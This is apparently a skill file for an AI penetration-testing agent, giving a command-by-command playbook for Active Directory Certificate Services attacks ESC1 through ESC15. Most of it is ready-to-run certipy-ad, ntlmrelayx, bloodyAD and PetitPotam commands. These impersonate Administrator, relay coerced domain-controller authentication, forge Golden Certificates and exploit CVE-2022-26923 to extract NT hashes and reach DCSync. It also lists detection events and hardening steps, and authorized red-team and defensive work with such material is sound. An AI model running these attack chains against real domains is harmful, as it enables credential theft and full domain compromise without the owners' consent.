---
name: AD-CS ESC
description: Reference for AD Certificate Services attacks ESC1-ESC15 covering vulnerable templates, PKINIT abuse, NTLM relay to ICPR, certifried (CVE-2022-26923), Certipy command matrix, and detection signatures.
---

# AD-CS ESC1-ESC15 Playbook

Reference for the SpecterOps "Certified Pre-Owned" attack family against Active Directory Certificate Services (AD-CS). Pull this in when you have any valid domain credential and want a focused, table-driven walk-through across the 15 documented ESC scenarios. Tools: `certipy-ad` (already installed in `kali_shell`).

> Black-box scope: probes drive AD-CS via certipy-ad. The agent has full toolset; this skill is the lookup table.

## Tool wiring

| Action | Tool | Notes |
|---|---|---|
| Enumerate templates / CAs / vulnerabilities | `kali_shell certipy-ad find` | Returns a structured report flagged by ESC type. |
| Request a certificate | `kali_shell certipy-ad req` | With `-template`, `-upn`, `-sid` for target identity. |
| Authenticate with a certificate | `kali_shell certipy-ad auth` | Returns NTLM hash or TGT. |
| Forge / manipulate certificates | `kali_shell certipy-ad forge` | For Golden Certificate when CA private key is captured. |
| NTLM relay to ICPR (ESC8) | `kali_shell impacket-ntlmrelayx` | `--target http://CA/certsrv/certfnsh.asp`. |

## Working directory

```bash
mkdir -p /tmp/adcs && cd /tmp/adcs
```

## Phase 0: enumerate

```bash
# All templates + vulnerability flags
certipy-ad find -u $USER@$DOMAIN -p $PASS -dc-ip $DC_IP \
  -vulnerable -stdout -output /tmp/adcs/cert
```

Inspect `/tmp/adcs/cert_*.txt` (text) or `/tmp/adcs/cert_*.json` (machine-readable). Each vulnerable template lists the matching ESC ID(s).

For a quick triage:

```bash
certipy-ad find -u $USER@$DOMAIN -p $PASS -dc-ip $DC_IP \
  -vulnerable -text 2>/dev/null | grep -E "ESC[0-9]+|Template Name" | head -100
```

## ESC matrix

| ID | What it is | Prereq | Probe |
|---|---|---|---|
| **ESC1** | Template with `Client Auth` EKU + `ENROLLEE_SUPPLIES_SUBJECT` flag (`CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`) | Any domain user with enroll rights | Request cert with arbitrary UPN: `certipy-ad req -template VULN -upn administrator@$DOMAIN` |
| **ESC2** | Template with `Any Purpose` EKU (or no EKU) + enrollee-supplies-subject | Same | Same flow as ESC1; the template is even more permissive |
| **ESC3** | Template with `Certificate Request Agent` EKU; allows enrollment-on-behalf-of (EOBO) | Any user with enroll rights on the EOBO template | Two-step: `certipy-ad req -template VulnEOBO`, then `req -on-behalf-of` for any user |
| **ESC4** | Vulnerable ACLs on a template (e.g. WriteOwner / WriteDACL / GenericAll for low-priv users) | Domain user | `certipy-ad template -template VULN -write-default-configuration`; rewrite the template to be ESC1-vuln, then exploit |
| **ESC5** | Vulnerable ACLs on a CA / PKI object in AD | Domain user | Modify CA ACL via `bloodyAD` or `impacket-dacledit` to grant yourself enrollment rights |
| **ESC6** | CA flag `EDITF_ATTRIBUTESUBJECTALTNAME2` set | Domain user with enroll rights on ANY auth-template | Submit cert request with custom SAN via `certipy-ad req -template Generic -upn admin@$DOMAIN -sid <admin-SID>` (note: ESC6 was patched in May 2022 by default) |
| **ESC7** | Low-priv user has `ManageCA` or `ManageCertificates` rights | Same | Add yourself as Officer; approve a previously-denied request: `certipy-ad ca -ca CAName -add-officer $USER`, then `certipy-ad ca -ca CAName -issue-request <id>` |
| **ESC8** | NTLM Relay to AD-CS Web Enrollment (`http://CA/certsrv/certfnsh.asp`) | Reachable web enrollment + coerced NTLM auth | `impacket-ntlmrelayx --target http://CA/certsrv/certfnsh.asp -smb2support --adcs --template <T>`; coerce a privileged machine via PetitPotam / DFSCoerce / PrinterBug |
| **ESC9** | Template with `no security extension` flag (UPN ignored, only DNS) + UPN-write on a target | Same as ESC1 + UPN write rights | Set victim's `userPrincipalName` to admin's UPN, request cert, restore UPN |
| **ESC10** | Weak `StrongCertificateBindingEnforcement` registry config + UPN-write or other identity-mapping abuse | Same | Hash collision on identity mapping; chain to KDC validation gap (CVE-2022-34691 family) |
| **ESC11** | NTLM relay to ICPR RPC (port 135 / dynamic) without `EnforceEncryptionForRequests` | Same as ESC8 but RPC instead of HTTP | `impacket-ntlmrelayx --target rpc://CA -rpc-mode ICPR --adcs --template <T>` |
| **ESC12** | YubiHSM / shell access to CA host | Local admin on CA | Read CA private key via the YubiHSM session; forge any cert |
| **ESC13** | Template with `Issuance Policy` linked to an OID that maps to a domain group | Same as ESC1 | Request cert with the issuance policy; cert grants implicit group membership at PKINIT auth |
| **ESC14** | DNS-name override / `userCertificate` weak validation | Same as ESC10 family | Subset of identity-mapping abuse |
| **ESC15** | Template version 1 + `EKUs` that are upgradable / impersonable (newer category, 2024) | Same | Pre-windows-2003 template enrollable by any user with arbitrary EKU |

Certipy reports each as `ESC#: VULNERABLE` in the `find -vulnerable` output. ESC1, ESC2, ESC3, ESC4, ESC8 are the most commonly seen in the wild.

## Per-ESC commands

### ESC1 (most common)

```bash
# Request a certificate as yourself, but UPN claims to be Administrator
certipy-ad req \
  -u $USER@$DOMAIN -p $PASS -dc-ip $DC_IP \
  -ca $CA_NAME \
  -template $VULN_TEMPLATE \
  -upn administrator@$DOMAIN \
  -out /tmp/adcs/admin

# Authenticate with the certificate to obtain Administrator's NT hash
certipy-ad auth -pfx /tmp/adcs/admin.pfx -dc-ip $DC_IP
# Output: Administrator: aad3b435...:5fbc3b...
```

Alternative output flag `-no-save -username administrator -domain $DOMAIN` returns just the credential without the .ccache.

### ESC2 (Any Purpose / no EKU)

Same flow as ESC1; the template is broader.

```bash
certipy-ad req -u $USER@$DOMAIN -p $PASS -dc-ip $DC_IP \
  -ca $CA_NAME -template $VULN_ANY_PURPOSE -upn administrator@$DOMAIN
certipy-ad auth -pfx administrator.pfx -dc-ip $DC_IP
```

### ESC3 (Enrollment Agent / EOBO)

```bash
# Step 1: enroll yourself in the Enrollment Agent template
certipy-ad req -u $USER@$DOMAIN -p $PASS -dc-ip $DC_IP \
  -ca $CA_NAME -template EnrollmentAgent

# Step 2: use that cert to enroll on behalf of a target user
certipy-ad req -u $USER@$DOMAIN -p $PASS -dc-ip $DC_IP \
  -ca $CA_NAME -template User \
  -on-behalf-of "$DOMAIN\\administrator" \
  -pfx EnrollmentAgent.pfx \
  -out /tmp/adcs/admin
certipy-ad auth -pfx /tmp/adcs/admin.pfx -dc-ip $DC_IP
```

### ESC4 (vulnerable template ACL)

```bash
# Step 1: rewrite the template to be ESC1-vulnerable
certipy-ad template -u $USER@$DOMAIN -p $PASS -dc-ip $DC_IP \
  -template VulnTemplate -write-default-configuration

# Step 2: exploit as ESC1 (above)

# After: restore the template to its original state
certipy-ad template -u $USER@$DOMAIN -p $PASS -dc-ip $DC_IP \
  -template VulnTemplate -write-original-configuration
```

### ESC6 (EDITF_ATTRIBUTESUBJECTALTNAME2)

```bash
certipy-ad req -u $USER@$DOMAIN -p $PASS -dc-ip $DC_IP \
  -ca $CA_NAME -template GenericClientAuth \
  -upn administrator@$DOMAIN
certipy-ad auth -pfx administrator.pfx
```

Note: Microsoft KB5014754 (May 2022) made this less straightforward; ESC6 is mostly historical now.

### ESC7 (ManageCA + ManageCertificates)

```bash
# Step 1: add yourself as Officer (requires ManageCA)
certipy-ad ca -u $USER@$DOMAIN -p $PASS -dc-ip $DC_IP \
  -ca $CA_NAME -add-officer $USER

# Step 2: enable SubCA template (requires ManageCertificates)
certipy-ad ca -u $USER@$DOMAIN -p $PASS -dc-ip $DC_IP \
  -ca $CA_NAME -enable-template SubCA

# Step 3: request via SubCA template; CA denies due to lack of permissions
certipy-ad req -u $USER@$DOMAIN -p $PASS -dc-ip $DC_IP \
  -ca $CA_NAME -template SubCA -upn administrator@$DOMAIN
# Capture the request ID from the denied response

# Step 4: issue the previously-denied request as Officer
certipy-ad ca -u $USER@$DOMAIN -p $PASS -dc-ip $DC_IP \
  -ca $CA_NAME -issue-request <request-id>

# Step 5: retrieve the issued certificate
certipy-ad req -u $USER@$DOMAIN -p $PASS -dc-ip $DC_IP \
  -ca $CA_NAME -retrieve <request-id>
certipy-ad auth -pfx administrator.pfx
```

### ESC8 (NTLM Relay to AD-CS HTTP)

The most-used AD-CS attack in modern engagements. Combines coerced authentication with HTTP relay.

> WARNING - relaying needs the DC's coerced authentication to connect BACK to ntlmrelayx, and a
> per-user Kali sandbox exposes only ONE target-reachable inbound port (see the "Pre-Configured
> Payload Settings" block). The coercion RPC call itself is outbound and fine; the DC's callback
> is what must reach you. An SMB callback (445) can never arrive, so only a WebDAV/HTTP callback
> to that one port works, and only if the DC runs the WebClient service (it sends credentials to
> an intranet-zone NAME, so a public tunnel hostname often gets no auth). Two numbers:
>   - pool (no tunnel): ntlmrelayx listens on the pool port P, and the DC is coerced to LHOST:P;
>   - ngrok/chisel: ntlmrelayx listens on 4444 (the local bind), and the DC is coerced to the
>     block's LHOST:LPORT (the public port the tunnel forwards to 4444).
> With no reachable inbound port this attack is not possible from the sandbox - record that and
> move on.

```bash
# LISTEN_PORT = the pool port, or 4444 with a tunnel. LHOST/LPORT come from the block.
# Terminal 1: ntlmrelayx with the ADCS template, HTTP listener on your one port, no SMB server.
# It holds your handler port for ALL your chats while it runs: `ss -ltn` first, stop it after.
impacket-ntlmrelayx -t http://$CA_HOST/certsrv/certfnsh.asp --adcs --template DomainController \
  --http-port $LISTEN_PORT --no-smb-server

# Terminal 2: coerce the DC to a WebDAV (HTTP) path on your reachable endpoint. The listener
# must be a NAME the DC resolves, in WebDAV form <name>@<port>/<path>:
nxc smb $DC_IP -u $USER -p $PASS -d $DOMAIN -M petitpotam -o LISTENER=<lhost-name>@<LPORT>/x

# Terminal 1 captures the coerced NTLM, relays to ICPR HTTP, gets cert as DC machine account
# Then:
certipy-ad auth -pfx <dc>.pfx -dc-ip $DC_IP
# DC machine account hash -> can DCSync
```

### ESC9 (no security extension + UPN write)

```bash
# Step 1: change victim's userPrincipalName to administrator's UPN
bloodyAD -u $USER -p $PASS -d $DOMAIN --host $DC_IP \
  set object victim_user userPrincipalName -v administrator

# Step 2: request a cert with the modified UPN
certipy-ad req -u victim@$DOMAIN -p $VICTIM_PASS \
  -ca $CA_NAME -template ESC9_TEMPLATE

# Step 3: restore the UPN
bloodyAD -u $USER -p $PASS -d $DOMAIN --host $DC_IP \
  set object victim_user userPrincipalName -v victim_original

# Step 4: authenticate with the certificate
certipy-ad auth -pfx victim.pfx -dc-ip $DC_IP -username administrator -domain $DOMAIN
```

### ESC10 / ESC14 (identity-mapping bypass)

Family of attacks chaining UPN / DNS-name confusion with weakened `StrongCertificateBindingEnforcement`. Highly environment-specific; treat each finding independently.

### ESC11 (NTLM Relay to ICPR RPC)

```bash
impacket-ntlmrelayx -t rpc://$CA_HOST -rpc-mode ICPR \
  --adcs --template DomainController -smb2support
# Coerce as in ESC8
```

### ESC13 (Issuance Policy -> implicit group)

```bash
# Find templates with Issuance Policy linked to a privileged group
certipy-ad find -u $USER -p $PASS -dc-ip $DC_IP -vulnerable -stdout | grep -A 5 "ESC13"

# Request a cert with the policy
certipy-ad req -u $USER -p $PASS -dc-ip $DC_IP \
  -ca $CA_NAME -template ESC13_TEMPLATE -application-policies <OID>

# PKINIT auth grants the implicit group at logon
certipy-ad auth -pfx esc13.pfx -dc-ip $DC_IP
```

### Golden Certificate (post-CA-compromise)

When you have local admin on the CA host and can extract the CA private key:

```bash
# On the CA: dump CA private key (e.g. via certipy-ad ca -backup or Mimikatz crypto::certificates)
# Bring the key + cert back to the attacker box

certipy-ad forge \
  -ca-pfx /tmp/adcs/ca.pfx \
  -upn administrator@$DOMAIN \
  -subject "CN=Administrator,CN=Users,DC=corp,DC=local"
certipy-ad auth -pfx administrator_forged.pfx -dc-ip $DC_IP
```

Equivalent to a Golden Ticket but at the certificate layer; survives password rotation of the impersonated user.

### Certifried (CVE-2022-26923)

Pre-patch (May 2022), a low-priv user could request a machine certificate with a custom dNSHostName and impersonate any computer including the DC. Post-patch, AD-CS validates the dNSHostName against the requesting account.

```bash
# Pre-patch only:
certipy-ad req -u $USER -p $PASS -dc-ip $DC_IP \
  -ca $CA_NAME -template Machine -dns DC.$DOMAIN
certipy-ad auth -pfx <fake-dc>.pfx -dc-ip $DC_IP
# DC$ account hash returned
```

If the target environment is fully patched (May 2022+), this no longer works.

## OPSEC

| Event | Why |
|---|---|
| Windows Event 4886 (Certificate Services received request) | Every certipy-ad request triggers this on the CA |
| Windows Event 4887 (Certificate Services approved request) | Successful issuance |
| Windows Event 4888 (Certificate Services denied request) | Failed issuance (used during ESC7 step 3) |
| Windows Event 4624 + LogonType 11 (cached cert auth) / 3 (network) | PKINIT auth via certipy auth |
| AD-CS audit log on CA host | Per-template request log |

Mitigations:

- One certificate per session per template; do not request 50 ESC1 certs in a row.
- ESC8 NTLM relay generates lots of authentication traffic; it is loud by design. Operator approval required.
- Notify the operator before AD-CS exploitation: "About to issue a certificate via $CA_NAME for the $TEMPLATE template - generates Event 4886/4887 on the CA. Proceeding unless you say stop."

## Validation shape

A clean AD-CS finding includes:

1. The vulnerable template / CA / ACL discovered (with the ESC ID).
2. The certipy-ad command(s) used.
3. The captured `.pfx` and the resulting NTLM hash / TGT.
4. The privilege escalation chain (e.g. domain user -> ESC1 with administrator UPN -> Administrator NT hash -> DCSync).
5. Operator-visible mitigation step (template was modified during ESC4? Confirm restoration).

## False positives

- `certipy-ad find -vulnerable` flags a template, but the requesting user lacks Enroll rights on that template.
- ESC8: web enrollment is reachable, but coercion fails (PetitPotam / DFSCoerce / PrinterBug all patched).
- ESC6: CA flag set, but `KB5014754` enforces strong validation and ignores SAN.
- `certipy-ad auth` returns "KDC_ERR_PADATA_TYPE_NOSUPP" -- KDC requires PKINIT padata that the cert can't satisfy. Likely fixed by `StrongCertificateBindingEnforcement = 2`.

## Hardening summary

- Audit every template's ACL: only specific groups should have Enroll / Write rights.
- Remove `ENROLLEE_SUPPLIES_SUBJECT` flag from templates with Client Authentication EKU unless absolutely necessary.
- Disable `EDITF_ATTRIBUTESUBJECTALTNAME2` on the CA.
- Enforce `KB5014754` (`StrongCertificateBindingEnforcement = 2`).
- Require approval for every certificate issuance (`PEND_ALL_REQUESTS` on the template).
- Disable AD-CS Web Enrollment (`/certsrv/`) and ICPR RPC if not needed; require LDAPS/CMC for cert requests.
- Apply `RequireSecurity` on RPC interfaces.
- Patch monthly; CVE-2022-26923 / CVE-2022-26931 / CVE-2022-26932 / KB5014754 closes most ESC primitives.

## Hand-off

```
Administrator NT hash extracted    -> /skill ad_kill_chain Phase 9 (DCSync)
DC machine account hash             -> DCSync directly
NTLM relay window opens             -> chain with PetitPotam / DFSCoerce / PrinterBug
Forged Golden Certificate            -> persistent post-rotation access
ESC enumeration only                 -> file findings with concrete chain to compromise
```

## Pro tips

- Always start with `certipy-ad find -vulnerable -stdout`. The output is the lookup-table you actually need; this skill is the reference for interpreting it.
- ESC1 is the most-encountered live finding because of how often `ENROLLEE_SUPPLIES_SUBJECT` is enabled by default on internally-developed templates.
- ESC8 is the most powerful chain: any low-priv domain user + reachable web enrollment + a coercion primitive = DC machine account NT hash = full domain compromise.
- The patch landscape shifts: CVE-2022-26923 (Certifried) was 2022, KB5014754 (May 2022) added strong binding enforcement. Always fingerprint the patch level via `Get-HotFix` (when post-exploit reach is available).
- `certipy-ad auth` returns a `.ccache` by default. For pass-the-hash chains, use `-no-save` and parse the NT hash from stdout.
- For ESC4: ALWAYS restore the template's original config after exploitation. A modified template left in place is a persistence-class risk and a defender alarm.
- The CA name is in `<dc>.dnsHostName,CN=Configuration,DC=...,CN=CA`; certipy-ad auto-discovers but you can confirm via `nxc ldap $DC_IP -u $USER -p $PASS --bloodhound`.
- Combine with BloodHound: `bhgraph dcsyncers` and `bhgraph kerberoastable` give the prioritized target list; `certipy-ad find -vulnerable` cross-references.
